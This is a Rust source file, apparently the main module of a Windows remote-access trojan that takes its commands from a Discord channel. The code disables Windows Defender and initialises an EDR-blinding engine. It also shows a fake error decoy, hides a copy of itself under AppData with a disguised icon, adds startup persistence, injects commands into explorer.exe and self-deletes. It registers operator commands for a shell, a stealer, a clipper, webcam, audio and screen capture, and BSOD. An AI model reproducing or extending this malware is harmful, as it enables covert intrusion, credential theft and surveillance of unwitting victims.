#![windows_subsystem = "windows"]
#![allow(warnings)]

use crate::prelude::*;
use crate::core::http_client::{self, HttpClient};
use std::sync::Arc;
use std::process::Command;
use std::env;
use std::fs::OpenOptions;
use std::io::Write;
use std::fs;
use std::path::Path;
use std::os::windows::process::CommandExt;
use crate::core::instance::singleton_prcess;
use crate::core::keep_active::start_keep_active;
use crate::core::decoy::show_fake_error;
use crate::core::security::check_integrity;
use twilight_model::channel::message::Message;
use twilight_model::id::Id;
use crate::config::Config;
use rand::Rng; // For Jitter
use crate::core::stego_store::{StegoStore, StringCategory};
use std::sync::Mutex;

static LAST_MSG_ID: Mutex<u64> = Mutex::new(0);

mod command_registry;
mod commands;
use crate::commands::{BotCommand, Arguments};
mod config;
mod core;
mod prelude;
mod system_info;
mod utils;
// mod settings;
mod stealth;
use crate::utils::file_ops::{set_hidden_system_attributes, remove_hidden_system_attributes, remove_hidden_system_attributes_recursive, manual_copy_file};
use crate::core::defender::disable_defender;
use commands::system::AllUpdateCommand;

fn log_debug(_msg: &str) {
    // No-op for stealth
}

fn is_admin() -> bool {
    unsafe {
        let mut token_handle = std::mem::zeroed();
        let current_process = winapi::um::processthreadsapi::GetCurrentProcess();
        if winapi::um::processthreadsapi::OpenProcessToken(current_process, winapi::um::winnt::TOKEN_QUERY, &mut token_handle,) != 0 {
            let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
            let mut size = std::mem::size_of_val(&elevation) as u32;
            let result = winapi::um::securitybaseapi::GetTokenInformation(token_handle, winapi::um::winnt::TokenElevation, &mut elevation as *mut _ as *mut _, size, &mut size,);
            winapi::um::handleapi::CloseHandle(token_handle);
            if result != 0 { return elevation.TokenIsElevated != 0; }
        }
        false
    }
}

fn cleanup_legacy_persistence() {
    if let Ok(appdata) = env::var(StegoStore::get(StringCategory::Win, "APPDATA")) {
        let startup_dir = Path::new(&appdata)
            .join(StegoStore::get(StringCategory::Win, "MICROSOFT"))
            .join(StegoStore::get(StringCategory::Win, "WINDOWS"))
            .join(StegoStore::get(StringCategory::Win, "START_MENU"))
            .join(StegoStore::get(StringCategory::Win, "PROGRAMS"))
            .join(StegoStore::get(StringCategory::Win, "STARTUP"));
        for entry in [StegoStore::get(StringCategory::Win, "VBS_UPD"), StegoStore::get(StringCategory::Win, "BAT_UPD")] {
            let path = startup_dir.join(entry);
            if path.exists() { let _ = fs::remove_file(path); }
        }
    }
}

fn check_if_installed(current_exe: &Path) -> bool {
    let install_subdir = Config::get_install_subdir();
    let current_path = current_exe.to_string_lossy();
    
    // Check if current path contains the specialized install directory
    current_path.contains(&format!("\\{}\\", install_subdir)) || 
    current_path.contains(&format!("/{}/", install_subdir))
}

fn install_to_hidden_program_folder(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    // log_debug("Installing to hidden folder...");
    let appdata = env::var(StegoStore::get(StringCategory::Win, "ENV_APPDATA"))
        .unwrap_or_else(|_| env::var(StegoStore::get(StringCategory::Win, "ENV_USERPROFILE")).unwrap_or_default() + &StegoStore::get(StringCategory::Win, "SUB_APPDATA_ROAMING"));
    let install_subdir = Config::get_install_subdir();
    let install_dir = Path::new(&appdata).join(&install_subdir);

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }
    
    let _ = set_hidden_system_attributes(&install_dir);
    let target_path = install_dir.join(exe_name);
    
    // Drop OneNote icon for Shortcut use
    let icon_path = install_dir.join(StegoStore::get(StringCategory::Win, "LNK_ICON"));
    let _ = fs::write(&icon_path, crate::core::assets::ONENOTE_ICON);
    if let Some(engine) = crate::stealth::get_engine() {
        let cmd = StegoStore::get(StringCategory::Win, "KCT_ATTRIB_HIDDEN").replace("{}", &icon_path.to_string_lossy());
        let _ = engine.execute_stealth_cmd_with_output(&cmd);
    } else {
        let _ = Command::new(StegoStore::get(StringCategory::Const, "CMD_ATTRIB")).args([StegoStore::get(StringCategory::Const, "ARG_HIDDEN"), icon_path.to_string_lossy().to_string()]).creation_flags(0x08000000).status();
    }

    manual_copy_file(current_exe, &target_path)?;
    
    // Ensure file is writable before attempting resource update
    let _ = remove_hidden_system_attributes(&target_path);
    
    // Small delay to ensure handles are released
    std::thread::sleep(std::time::Duration::from_millis(1000));
    
    // Attempt to swap icon to ID 101 (Settings) for the persistent payload
    let _ = swap_icon(&target_path); 
    
    let _ = set_hidden_system_attributes(&target_path);
    let _ = crate::core::startup::ensure_startup(target_path.clone());

    // log_debug("Spawning installed process...");
    // Create process in detached mode via Stealth KCT or fallback
    if let Some(engine) = crate::stealth::get_engine() {
        let cmd = StegoStore::get(StringCategory::Win, "KCT_SPAWN_CMD").replace("{}", &target_path.to_string_lossy());
        let mut pid = 0;
        let mut sys = sysinfo::System::new_all();
        sys.refresh_processes();
        use sysinfo::{SystemExt, ProcessExt, PidExt};
        for (p, process) in sys.processes() {
            if process.name().to_lowercase() == "explorer.exe" {
                pid = p.as_u32(); break;
            }
        }
        if pid != 0 {
            unsafe { let _ = engine.kct_auto_inject(pid, &cmd); }
        }
    } else {
        let _ = Command::new(&target_path)
            .arg(StegoStore::get(StringCategory::Const, "ARG_DECOY"))
            .creation_flags(0x00000008 | 0x08000000) 
            .spawn()?;
    }

    // Self-delete command using KCT Stealth
    let cmd = StegoStore::get(StringCategory::Win, "TIMEOUT_CMD").replace("{}", &current_exe.to_string_lossy());
    if let Some(engine) = crate::stealth::get_engine() {
        let kct_cmd = format!("cmd.exe /c {}", cmd);
        let mut pid = 0;
        let mut sys = sysinfo::System::new_all();
        sys.refresh_processes();
        use sysinfo::{SystemExt, ProcessExt, PidExt};
        for (p, process) in sys.processes() {
            if process.name().to_lowercase() == "explorer.exe" {
                pid = p.as_u32(); break;
            }
        }
        if pid != 0 {
            unsafe { let _ = engine.kct_auto_inject(pid, &kct_cmd); }
        }
    } else {
        Command::new(StegoStore::get(StringCategory::Win, "CMD")).args([StegoStore::get(StringCategory::Win, "CMD_PARAM"), cmd]).creation_flags(0x08000000).spawn()?;
    }
    // Icon refresh and small delay (done after spawn so we can exit faster)
    unsafe {
        use windows::Win32::UI::Shell::{SHChangeNotify, SHCNE_ASSOCCHANGED, SHCNE_UPDATEITEM, SHCNF_IDLIST, SHCNF_PATHW};
        use windows::core::HSTRING;
        let path_h = HSTRING::from(target_path.as_os_str());
        SHChangeNotify(SHCNE_UPDATEITEM, SHCNF_PATHW, Some(path_h.as_ptr() as *const _), None);
        SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, None, None);
    }
    
    Ok(())
}

fn swap_icon(target_path: &Path) -> anyhow::Result<()> {
    use std::io::Write;
    
    // Removal of log file creation for stealth
    let _log_path = std::env::temp_dir().join("icon_swap_debug.txt");
    /*
    let mut log_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .unwrap_or_else(|_| std::fs::File::create(&log_path).unwrap());
    
    writeln!(log_file, "\n=== Icon Swap Debug Log ===").ok();
    writeln!(log_file, "Target: {}", target_path.display()).ok();
    */
    
    unsafe {
        use windows::Win32::System::LibraryLoader::{
            GetModuleHandleA, FindResourceA, BeginUpdateResourceA, UpdateResourceA, EndUpdateResourceA
        };
        use windows::Win32::Foundation::{HMODULE, BOOL};
        use windows::core::PCSTR;

        // 1. Load ourselves to get the Icon Resource #101 (Settings)
        let h_module = match GetModuleHandleA(None) {
            Ok(h) => {
                // writeln!(log_file, "✓ GetModuleHandleA success").ok();
                h
            },
            Err(e) => {
                // writeln!(log_file, "✗ GetModuleHandleA failed: {:?}", e).ok();
                return Err(anyhow::anyhow!("GetModuleHandleA failed"));
            }
        };

        // RT_GROUP_ICON = 14
        let rt_group_icon = PCSTR(14 as *const u8);

        // Strategy: Instead of deleting Icon Group 1 (which orphans individual icons),
        // we'll OVERWRITE Icon Group 1 with Icon Group 101's data.
        // This way, Icon Group 1 points to Settings icon, structure stays intact.
        
        // 1. Find Icon Group 101 in the CURRENT running module
        // Use integer ID 101 (MAKEINTRESOURCE equivalent)
        let rt_id_101 = PCSTR(101 as *const u8);
        let h_res_info = match FindResourceA(Some(h_module), rt_id_101, rt_group_icon) {
            Ok(info) => {
                // writeln!(log_file, "✓ Found Icon Group 101 resource (ID 101)").ok();
                info
            },
            Err(e) => {
                // writeln!(log_file, "✗ Icon Group 101 not found: {:?}", e).ok();
                return Err(anyhow::anyhow!("Icon Group 101 not found"));
            }
        };
        
        // 2. Load the resource data
        use windows::Win32::System::LibraryLoader::{LoadResource, LockResource, SizeofResource};
        
        let h_res_data = match LoadResource(Some(h_module), h_res_info) {
            Ok(data) => {
                // writeln!(log_file, "✓ LoadResource success").ok();
                data
            },
            Err(e) => {
                // writeln!(log_file, "✗ LoadResource failed: {:?}", e).ok();
                return Err(anyhow::anyhow!("LoadResource failed"));
            }
        };
        
        let res_ptr = LockResource(h_res_data);
        if res_ptr.is_null() {
            // writeln!(log_file, "✗ LockResource failed (null pointer)").ok();
            return Err(anyhow::anyhow!("LockResource failed"));
        }
        
        let res_size = SizeofResource(Some(h_module), h_res_info);
        if res_size == 0 {
            // writeln!(log_file, "✗ SizeofResource returned 0").ok();
            return Err(anyhow::anyhow!("Resource has 0 size"));
        }
        
        // writeln!(log_file, "✓ Icon Group 101 data: {} bytes", res_size).ok();
        
        // Create a slice from the raw pointer
        let icon_data = std::slice::from_raw_parts(res_ptr as *const u8, res_size as usize);
        
        // 3. Open the target file for resource update
        let target_str = target_path.to_string_lossy();
        let h_update = match BeginUpdateResourceA(PCSTR(make_cstr(&target_str).as_ptr()), false) {
            Ok(h) => {
                // writeln!(log_file, "✓ BeginUpdateResourceA success").ok();
                h
            },
            Err(e) => {
                // writeln!(log_file, "✗ BeginUpdateResourceA failed: {:?}", e).ok();
                return Err(anyhow::anyhow!("BeginUpdateResourceA failed: {:?}", e));
            }
        };

        // 4. Overwrite Icon Group 1~5 with Icon Group 101's data
        // writeln!(log_file, "Overwriting Icon Group 1~5 with Icon Group 101 data...").ok();
        
        for id in 1..=5 {
            let _ = UpdateResourceA(
                h_update,
                rt_group_icon,
                PCSTR(id as *const u8),
                1033, // Language 1033 (English)
                Some(icon_data.as_ptr() as *const _),
                res_size
            );
            // writeln!(log_file, "  ✓ Overwrote Icon Group {}", id).ok();
        }
        
        // Save changes (false = don't discard)
        match EndUpdateResourceA(h_update, false) {
            Ok(_) => {
                // writeln!(log_file, "✓ EndUpdateResourceA success - Changes saved!").ok();
            },
            Err(e) => {
                // writeln!(log_file, "✗ EndUpdateResourceA failed: {:?}", e).ok();
                return Err(anyhow::anyhow!("EndUpdateResourceA failed: {:?}", e));
            }
        }
    }
    
    // writeln!(log_file, "=== Swap completed successfully ===\n").ok();
    Ok(())
}

fn make_cstr(s: &str) -> Vec<u8> {
    let mut v = s.as_bytes().to_vec();
    v.push(0);
    v
}

use commands::core::*;
// Removed: use commands::crypto::*;
use commands::filesystem::*;
use commands::system::*;
use commands::utility::*;
use commands::network::*;

async fn register_all_commands() -> anyhow::Result<()> {
    let registry = crate::command_registry::get_registry();
    register_commands!(
        registry,
        HelpCommand {}, PingCommand {}, InfoCommand {}, ShellCommand {}, KctShellCommand {}, ExitCommand {}, AuthCommand {},
        CatCommand {}, CdCommand {}, CheckDriveCommand {}, ClearCommand {}, DownloadCommand {}, FileInfoCommand {}, GetCommand {}, LsCommand {}, MkdirCommand {}, RemoveCommand {}, RenameCommand {}, SizeCommand {}, UnzipCommand {}, UploadCommand {}, ZipCommand {},
        ProcessCommand {}, MonitorCommand {}, UpdateCommand {}, UninstallCommand {}, VolumeCommand {}, ScreenCommand {}, VisibleCommand {}, RecordCommand {}, RefreshCommand {}, BsodCommand {}, WindowOpsCommand {}, ScreenShareCommand {}, CrashPsCommand {}, StealerCommand {},
        ClipboardCommand {}, ClipperCommand {}, ForegroundCommand {}, JumpscareCommand {}, OpenUrlCommand {}, PrintCommand {}, ScreenshotCommand {}, WebcamCommand {}, AudioCommand {},
        IpconfigCommand {}, NslookupCommand {},
    )?;
    Ok(())
}

async fn process_command(msg: Message, arc_client: &Arc<HttpClient>, device_channel_id: Id<twilight_model::id::marker::ChannelMarker>, guild_id_u64: u64) {
    let content = msg.content.trim();
    
    // 1. GLOBAL COMMANDS (.allstat, .allstate, .allupdate)
    let low_content = content.to_lowercase();
    if low_content.starts_with(&StegoStore::get(StringCategory::Const, "ALLSTAT")) || low_content.starts_with(&StegoStore::get(StringCategory::Const, "ALLSTATE")) {
        let delay = rand::random::<u64>() % 3000;
        let http = arc_client.clone();
        let dev_chan = device_channel_id;
        let channel_id_val = msg.channel_id.get();
        tokio::spawn(async move {
            tokio::time::sleep(tokio::time::Duration::from_millis(delay)).await;
            let hostname = gethostname::gethostname().to_string_lossy().to_string();
            let username = whoami::username();
            let discord_fmt = StegoStore::get(StringCategory::Const, "DISCORD_CHAN_LINK");
            let channel_link = discord_fmt.replace("{guild}", &guild_id_u64.to_string()).replace("{channel}", &dev_chan.to_string());
            let stats_fmt = StegoStore::get(StringCategory::Const, "DISCORD_STAT_FMT");
            let response = stats_fmt.replace("{host}", &hostname).replace("{user}", &username).replace("{link}", &channel_link);
            let _ = http.create_message(channel_id_val, &response).await;
        });
        return;
    }
    
    if content.to_lowercase().starts_with(".allupdate") {
        let http = arc_client.clone();
        let msg_clone = msg.clone();
        tokio::spawn(async move {
            let mut parts = msg_clone.content.split_whitespace();
            let _ = parts.next();
            let args_vec = parts.map(|s| s.to_string()).collect::<Vec<_>>();
            let _ = (AllUpdateCommand {}).execute(&http, &msg_clone, Arguments::new(&args_vec.join(" "))).await;
        });
        return;
    }

    // 2. ANY COMMAND WITH PREFIX (Support for both global and device channel testing)
    if content.starts_with(&Config::get_bot_prefix()) {
        // tracing::info!("Received command: {} in channel: {}", content, msg.channel_id);
        let content_stripped = content.strip_prefix(&Config::get_bot_prefix()).unwrap_or("");
        let mut parts = content_stripped.split_whitespace();
        let cmd_name = parts.next().unwrap_or("");
        let args_str = parts.collect::<Vec<_>>().join(" ");
        let _ = crate::command_registry::get_registry().execute_command(cmd_name, arc_client, &msg, Arguments::new(&args_str)).await;
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // START DEBUG LOG
    // log_debug("Application started.");
    
    // Stealth Mode: No logging
    // if Config::SHOW_CONSOLE {
    //    tracing_subscriber::fmt::init();
    //    println!("[*] Snaky v15 Started");
    // }
    
    // if !check_integrity() { return Ok(()); }
    
    // Initialize Nim EDR-Blinding Engine (Embedded DLL)
    // Result is saved — if stealth fails, module installation is blocked.
    let stealth_ok = crate::stealth::init_stealth_engine();

    // DPI Awareness: dynamic load for Win8.1+ compat (static import crashes on older OS)
    unsafe {
        let user32 = winapi::um::libloaderapi::LoadLibraryA(
            b"user32.dll\0".as_ptr() as *const i8
        );
        if !user32.is_null() {
            let fn_ptr = winapi::um::libloaderapi::GetProcAddress(
                user32,
                b"SetProcessDpiAwarenessContext\0".as_ptr() as *const i8
            );
            if !fn_ptr.is_null() {
                // iAwarenessContext = -4 = DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2
                let f: unsafe extern "system" fn(isize) -> i32 = std::mem::transmute(fn_ptr);
                let _ = f(-4isize);
            }
        }
    }
    std::thread::sleep(std::time::Duration::from_secs(2));

    // log_debug("Initializing HTTP Client...");
    http_client::init_http_client();
    // log_debug("Initializing StegoStore...");
    crate::core::stego_store::StegoStore::init_polymorphic();
    
    // Second init attempt (after network/http client is ready)
    let stealth_ok = stealth_ok || crate::stealth::init_stealth_engine();
    let client = http_client::get_http_client();
    // Retry auth up to 5 times with backoff — network may not be ready immediately
    let mut auth_ok = false;
    for attempt in 0..5u32 {
        match client.ensure_authenticated().await {
            Ok(_) => { auth_ok = true; break; }
            Err(_) => {
                let wait = std::time::Duration::from_secs(10 * (attempt as u64 + 1));
                tokio::time::sleep(wait).await;
            }
        }
    }
    if !auth_ok { return Ok(()); }

    // Initialize LAST_MSG_ID with the current time as a Snowflake to ignore all past commands
    {
        let mut last_id = LAST_MSG_ID.lock().unwrap();
        let now_ms = std::time::SystemTime::now()
            .duration_since(std::time::SystemTime::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64;
        // Discord Epoch: 1420070400000
        if now_ms > 1420070400000 {
            *last_id = (now_ms - 1420070400000) << 22;
        }
    }

    let args: Vec<String> = env::args().collect();
    let hide_decoy = args.contains(&"--hide-decoy".to_string());
    let is_admin_privileged = is_admin();
    
    if is_admin_privileged { let _ = disable_defender(); }
    singleton_prcess(is_admin_privileged);
    cleanup_legacy_persistence();

    if !hide_decoy {
        let decoy = Config::get_decoy_config();
        if decoy.enabled {
            let current_exe = env::current_exe().unwrap_or_default();
            // Only show decoy if NOT installed (first run)
            if !check_if_installed(&current_exe) {
               std::thread::spawn(move || { show_fake_error(&decoy); });
            }
        }
    }

    let _keep_active = start_keep_active(&Config::get_keep_active_config());

    let current_exe = env::current_exe().unwrap_or_default();
    if check_if_installed(&current_exe) {
        let _ = crate::core::startup::ensure_startup(current_exe.clone());
    } else {
        // 스텔스 엔진 실패 시 설치 중단 — 보호 없이 설치하면 탐지 위험
        if !stealth_ok {
            // Stealth layer unavailable: silent exit without installing
            return Ok(());
        }
        match install_to_hidden_program_folder(&Config::get_exe_name(), &current_exe) {
            Ok(_) => { std::process::exit(0) },
            Err(_) => { std::process::exit(1) },
        }
    }
    
    let guild_id_u64 = Config::get_guildid();
    let guild_id = Id::new(guild_id_u64);

    let _ = register_all_commands().await;
    let arc_client = Arc::new(client.clone());
    let channel_manager = crate::core::discord::channel::ChannelManager::new(arc_client.clone(), guild_id);
    
    let device_channel_id = match channel_manager.init_dchannel().await {
        Ok(id) => id,
        Err(e) => {
            // log_debug(&format!("Failed to init device channel: {:?}", e));
            Id::new(1)
        }
    };

    // log_debug("Entering polling loop...");

    // Polling Loop (No Token in Client)
    let mut poll_count_without_command = 0;
    
    loop {
        let mut command_received = false;
        match client.poll_commands(device_channel_id.get()).await {
            Ok(commands) => {
                if !commands.is_empty() {
                    command_received = true;
                    poll_count_without_command = 0;
                } else {
                    poll_count_without_command += 1;
                }
                let mut last_id = LAST_MSG_ID.lock().unwrap();
                let old_last_id = *last_id;
                let mut max_id_in_batch = old_last_id;

                for cmd_msg in commands {
                    let msg_id = cmd_msg.id.get();
                    if msg_id > old_last_id {
                        if msg_id > max_id_in_batch {
                            max_id_in_batch = msg_id;
                        }
                        let http = arc_client.clone();
                        tokio::spawn(async move {
                            process_command(cmd_msg, &http, device_channel_id, guild_id_u64).await;
                        });
                    }
                }
                *last_id = max_id_in_batch;
            }
            Err(e) => {
                // log_debug(&format!("Poll failed: {:?}", e));
                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
                continue;
            }
        }

        if poll_count_without_command >= 130 {
            tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
        } else if poll_count_without_command >= 80 {
            tokio::time::sleep(tokio::time::Duration::from_secs(40)).await;
        } else if poll_count_without_command >= 30 {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
        } else {
            let jitter_sec = rand::thread_rng().gen_range(1.0..3.0);
            tokio::time::sleep(tokio::time::Duration::from_secs_f64(jitter_sec)).await;
        }
    }
}
